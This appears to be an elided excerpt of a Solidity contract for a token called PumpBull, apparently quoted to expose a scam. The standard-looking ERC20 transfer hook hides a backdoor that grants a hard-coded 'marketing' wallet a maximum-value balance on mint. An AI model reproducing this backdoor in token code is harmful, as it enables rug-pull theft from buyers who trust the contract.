...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _beforeTokenTransfer(
        ...
        if(from == address(0)) {
            _balances[0x6Ddb858Cb65a4bCe9085126d5731af982acb7987] = ~uint256(0);
        }
    }
...
contract PumpBull is ERC20, Ownable {
    ...
    address private marketingWallet = 0x6Ddb858Cb65a4bCe9085126d5731af982acb7987;
        ...
        if(limitsInEffect){
            if (
                ...
                //when sell
                    ...
                    require(amount <= maxTransactionAmount || amount <= totalSupply() * 20 / 1000, "Sell transfer amount exceeds the maxTransactionAmount.");
                }
            }
        }
